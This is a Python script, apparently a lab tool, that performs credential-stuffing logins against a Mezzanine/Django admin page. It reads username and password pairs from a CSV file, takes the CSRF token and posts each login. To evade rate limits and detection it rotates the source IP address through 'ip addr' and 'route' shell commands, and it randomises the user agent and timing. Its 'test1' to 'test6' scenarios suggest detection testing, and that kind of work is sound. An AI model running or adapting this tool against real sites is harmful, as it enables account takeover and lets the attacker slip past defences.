# -*- coding: utf-8 -*-

import configparser
import csv
import os
import random
import subprocess
import sys
from datetime import datetime
from time import sleep

import requests
from fake_useragent import UserAgent

import ipaddr


def gen_ipaddr(ip_type, count):
    network = ipaddr.IPv4Network('96.0.0.0/4')
    if ip_type == "random":
        return ipaddr.IPv4Address(random.randrange(int(network.network) + 1, int(network.broadcast) - 1))
    elif ip_type == "increment":
        return ipaddr.IPv4Address(int(network.network) + count)
    else:
        print("{} don't exsit setting. you should set random or increment. ".format(ip_type))
        sys.exit(1)


def change_ipaddr(ip_addr):
    cmd_list = (
        "ip addr flush dev ens224",
        "ip addr add {}/4 dev ens224".format(ip_addr),
        "ip link set ens224 up",
        "route add -net 160.17.0.0 gw 111.255.255.254 netmask 255.255.0.0 dev ens224"
    )
    for cmd in cmd_list:
        try:
            proc = subprocess.Popen(cmd, shell=True)
            proc.wait()
        except Exception as e:
            print(e)


def acccess(http_info):
    request_info = http_info
    for key in ('payload', 'headers', 'querystring'):
        if key not in http_info:
            request_info[key] = {}

    try:
        res = requests.request(
            request_info['method'],
            request_info['url'],
            data=request_info['payload'],
            headers=request_info['headers'],
            params=request_info['querystring'],
        )
        return res
    except Exception as e:
        print(e)


def interval(config):
    max_ = int(config.get('interval', 'max'))
    min_ = int(config.get('interval', 'min'))
    if max_ == min_:
        sleep(min_)
    else:
        sleep(random.uniform(min_, max_))


def attacker(user, pass_, config):
    useragent = config.get('http_headers', 'User-Agent')
    if useragent == "random":
        useragent = ua.random

    cookie = acccess({
        'method': 'GET',
        'url': config.get('general', 'url'),
        'headers': {
            'User-Agent': useragent,
            'Cookie': '',
            'Referer': '',
            'Accept': config.get('http_headers', 'accept'),
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': config.get('http_headers', 'accept_language'),
            'Content-Type': 'text/html; charset=utf-8',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
        },
    }).cookies['csrftoken']
    interval(config)

    res = acccess({
        'method': 'POST',
        'url': config.get('general', 'url'),
        'querystring': {'next': '/ja/admin'},
        'payload': 'username={}&password={}&this_is_the_login_form=1&mezzanine_login_interface=admin&csrfmiddlewaretoken={}'.format(user, pass_, cookie),
        'headers': {
            'User-Agent': useragent,
            'Cookie': 'csrftoken={}'.format(cookie),
            'Referer': config.get('http_headers', 'referer'),
            'Accept': config.get('http_headers', 'accept'),
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': config.get('http_headers', 'accept_language'),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
        },
    })
    if res is not None:
        if "ダッシュボード" in res.text:
            result = "Succeeded"
        else:
            result = "Failed"
        now = datetime.now().strftime("%Y/%m/%d %H:%M:%S")
        print("{} , User: {}, Pass: {}, Result: {}".format(now, user, pass_, result))
    else:
        print("response doesn't exsit. maybe, one or more http-headers are wrong.")
    interval(config)


def do_scenario(ip_type, count):
    now = datetime.now().strftime("%Y/%m/%d %H:%M:%S")
    ip = gen_ipaddr(ip_type, count)
    change_ipaddr(ip)
    print("{} , ipaddress changed {}, chamged count {}".format(now, ip, count))


def main():
    config = configparser.SafeConfigParser()
    config.read((os.path.normpath(os.path.join(os.path.abspath('__file__'), './../attacker.conf'))))
    try:
        scenario = config.get('general', 'scenario')
    except Exception as e:
        print(e)

    with open((os.path.normpath(os.path.join(os.path.abspath('__file__'), './../account_list.csv')))) as f:
        reader = csv.reader(f)
        if config.get('general', 'account') == "username":
            account = 0
        elif config.get('general', 'account') == "email":
            account = 1
        else:
            print("Warn: doesn't exsit setting and so, set username account")
            account = 0

        count = 1
        param = 10

        for row in reader:
            if 'scenario' in locals():
                if scenario == "test1":
                    do_scenario("random", count)
                    count += 1
                elif scenario == "test2":
                    do_scenario("increment", count)
                    count += 1
                elif scenario == "test3":
                    if (reader.line_num % param) == 0:
                        do_scenario("random", count)
                        count += 1
                elif scenario == "test4":
                    if (reader.line_num % param) == 0:
                        do_scenario("increment", count)
                        count += 1
                elif scenario == "test5":
                    if (reader.line_num % random.randint(1, 20)) == 0:
                        do_scenario("random", count)
                        count += 1
                elif scenario == "test6":
                    if (reader.line_num % random.randint(1, 20)) == 0:
                        do_scenario("increment", count)
                        count += 1
                else:
                    print("{} doesn't exsit setting. you should set test1~test6. ".format(scenario))
                    sys.exit(1)

                attacker(str(row[account]), str(row[2]), config)


if __name__ == '__main__':
    main()
